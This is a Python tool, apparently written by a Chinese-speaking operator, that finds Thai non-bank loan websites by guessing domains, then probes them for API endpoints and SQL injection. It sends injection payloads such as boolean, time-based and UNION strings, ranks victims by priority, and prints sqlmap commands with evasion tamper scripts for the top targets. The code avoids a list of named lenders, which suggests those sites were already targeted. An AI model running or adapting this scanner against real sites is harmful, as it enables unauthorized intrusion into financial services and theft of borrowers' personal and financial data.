#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Thai Loan Discovery System - Simple Version
泰国非银行贷款公司目标发现系统 - 简化版
"""

import requests
import re
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import ssl
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThaiLoanDiscoverySimple:
    """泰国贷款目标发现器 - 简化版"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        # 避免的已知目标
        self.avoid_targets = [
            'moneycat.co.th', 'mula-x.com', 'rocket-cash.com',
            'kloan.co.th', 'ngerntidlor.com', 'peacoop.or.th', 'ngoenmun.com'
        ]

        # 泰国贷款关键词
        self.thai_keywords = [
            'เงินด่วน', 'สินเชื่อ', 'เงินกู้', 'สินเชื่อออนไลน์',
            'ประเภท', 'บัตรเครดิต', 'วงเงิน', 'กู้ยืม',
            'กู้ด่วน', 'สินเชื่อด่วน', 'p2p', 'lending',
            'loan', 'credit', 'finance', 'microloan', 'quickloan'
        ]

        # 发现的目标
        self.discovered_targets = []

    def generate_potential_targets(self):
        """生成潜在目标URL"""
        print("生成潜在的泰国贷款目标URL...")

        base_names = [
            'fastloan', 'easycredit', 'quickcash', 'smartmoney',
            'rapidloan', 'instantloan', 'flashloan', 'speedycash',
            'digitallending', 'onlinecredit', 'quickfund', 'fastfund',
            'instantfund', 'digitalloan', 'webloan', 'easycash'
        ]

        thai_domains = ['.co.th', '.go.th', '.in.th', '.ac.th']
        potential_urls = []

        for base_name in base_names:
            for domain in thai_domains:
                potential_url = f"https://{base_name}{domain}"
                if not any(avoid in potential_url for avoid in self.avoid_targets):
                    potential_urls.append(potential_url)

        return potential_urls[:15]  # 返回前15个

    def check_target(self, url):
        """检查目标是否为贷款网站"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'
            }

            response = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                content = response.text.lower()
                loan_score = 0

                # 计算贷款指标分数
                for keyword in self.thai_keywords:
                    if keyword in content:
                        loan_score += 1

                if any(indicator in content for indicator in ['form', 'input', 'application', 'สมัคร']):
                    loan_score += 2

                if loan_score >= 3:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'loan_score': loan_score,
                        'title': self.get_title(response.text),
                        'is_loan_site': True
                    }

        except:
            pass
        return None

    def get_title(self, html_content):
        """提取网页标题"""
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
        return title_match.group(1).strip() if title_match else "Unknown"

    def discover_apis(self, base_url):
        """发现API端点"""
        api_paths = [
            '/api/v1/apply',
            '/api/application',
            '/api/loan/submit',
            '/api/loan/calculate',
            '/api/user/register',
            '/api/user/login',
            '/api/loan/status',
            '/api/customer',
            '/v1/apply',
            '/v1/application',
            '/wp-json/api/v1',
            '/rest/api/loan',
            '/api/loan'
        ]

        discovered_apis = []

        for api_path in api_paths:
            api_url = urljoin(base_url, api_path)
            try:
                response = requests.get(
                    api_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.status_code == 200:
                    discovered_apis.append({
                        'endpoint': api_path,
                        'status': response.status_code
                    })

            except:
                continue

        return discovered_apis

    def test_injection_points(self, base_url):
        """测试SQL注入点"""
        test_cases = [
            {'url': f"{base_url}/application.php?id=1", 'param': 'id'},
            {'url': f"{base_url}/apply?loan_id=1", 'param': 'loan_id'},
            {'url': f"{base_url}/calculate?amount=10000", 'param': 'amount'},
            {'url': f"{base_url}/user?user_id=1", 'param': 'user_id'},
            {'url': f"{base_url}/search?q=test", 'param': 'q'}
        ]

        injection_points = []

        for test_case in test_cases:
            try:
                test_payloads = [
                    "1' OR '1'='1",
                    "1\" OR \"1\"=\"1",
                    "1 AND SLEEP(5)",
                    "1 UNION SELECT NULL--"
                ]

                for payload in test_payloads:
                    params = {test_case['param']: payload}
                    response = requests.get(
                        test_case['url'],
                        params=params,
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=5,
                        verify=False
                    )

                    if response.elapsed.total_seconds() > 3 or 'sql' in response.text.lower():
                        injection_points.append({
                            'url': test_case['url'],
                            'parameter': test_case['param'],
                            'payload': payload,
                            'response_time': response.elapsed.total_seconds()
                        })
                        break

            except:
                continue

        return injection_points

    def generate_report(self, targets):
        """生成报告"""
        print(f"\n=== 泰国贷款目标发现报告 ===")
        print(f"发现时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"发现目标: {len(targets)}")

        report = {
            'discovery_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets': len(targets),
            'high_priority': [],
            'medium_priority': [],
            'low_priority': []
        }

        for target in targets:
            if target['loan_score'] >= 7:
                report['high_priority'].append(target)
            elif target['loan_score'] >= 5:
                report['medium_priority'].append(target)
            else:
                report['low_priority'].append(target)

        with open('thai_loan_discovery_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n目标分类:")
        print(f"  高优先级: {len(report['high_priority'])}")
        print(f"  中优先级: {len(report['medium_priority'])}")
        print(f"  低优先级: {len(report['low_priority'])}")

        return report

    def run_discovery(self):
        """运行发现流程"""
        print("启动泰国贷款目标发现系统...")

        # 1. 生成潜在目标
        potential_targets = self.generate_potential_targets()
        print(f"生成 {len(potential_targets)} 个潜在目标")

        # 2. 检查目标
        print("\n检查目标存活性...")
        live_targets = []

        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = {executor.submit(self.check_target, url): url for url in potential_targets}

            for future in as_completed(futures):
                target = future.result()
                if target and target['is_loan_site']:
                    live_targets.append(target)
                    print(f"发现: {target['url']} (分数: {target['loan_score']})")

        print(f"\n存活的贷款网站: {len(live_targets)} 个")

        # 3. 深度扫描
        print("\n深度扫描前10个目标...")
        live_targets.sort(key=lambda x: x['loan_score'], reverse=True)

        for i, target in enumerate(live_targets[:10]):
            print(f"\n[{i+1}/10] 深度扫描: {target['url']}")

            # 发现API端点
            apis = self.discover_apis(target['url'])
            if apis:
                target['apis'] = apis
                print(f"发现API端点: {len(apis)} 个")

            # 测试SQL注入
            injection_points = self.test_injection_points(target['url'])
            if injection_points:
                target['injection_points'] = injection_points
                print(f"发现潜在SQL注入点: {len(injection_points)} 个")

        # 4. 生成报告
        self.discovered_targets = live_targets
        report = self.generate_report(live_targets)

        return report

def main():
    """主函数"""
    discovery = ThaiLoanDiscoverySimple()

    try:
        report = discovery.run_discovery()

        # 生成SQLMap攻击命令
        if report['high_priority']:
            print(f"\n发现 {len(report['high_priority'])} 个高优先级目标")
            print("\n推荐SQLMap攻击命令:")

            for i, target in enumerate(report['high_priority'][:5]):
                print(f"\n目标 {i+1}: {target['url']}")

                # 基本攻击
                base_cmd = f"sqlmap -u \"{target['url']} --batch --level=5 --risk=3 --random-agent --tamper=\"space2comment,randomcase,charencode\" --fresh-queries --banner --current-db"
                print(f"基础: {base_cmd}")

                # 如果有API端点
                if 'apis' in target and target['apis']:
                    for api in target['apis'][:2]:
                        api_url = urljoin(target['url'], api['endpoint'])
                        param = 'id' if '=' in api['endpoint'] else '1'
                        api_cmd = f"sqlmap -u \"{api_url}\" -p {param} --batch --level=4 --risk=2 --tamper=\"space2comment,randomcase\" --fresh-queries"
                        print(f"API: {api_cmd}")

        print(f"\n详细报告已保存到: thai_loan_discovery_report.json")

    except KeyboardInterrupt:
        print("\n目标发现已取消")
    except Exception as e:
        print(f"发现错误: {e}")

if __name__ == "__main__":
    main()